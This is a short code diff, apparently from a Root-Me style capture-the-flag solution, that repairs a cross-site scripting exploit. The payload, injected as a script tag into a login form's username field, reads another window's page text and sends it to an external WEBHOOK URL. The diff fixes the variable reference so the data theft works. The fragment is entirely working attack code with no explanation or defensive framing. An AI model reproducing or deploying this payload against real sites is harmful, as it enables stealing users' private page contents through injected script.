@@ -23,8 +23,8 @@ try {
   const profile = window.open(PROFILE, "rootme");
 
   const payload = `
-window.open("", "rootme");
-window.location = "${WEBHOOK}?" + rootme.document.body.innerText;
+const profile = window.open("", "rootme");
+window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
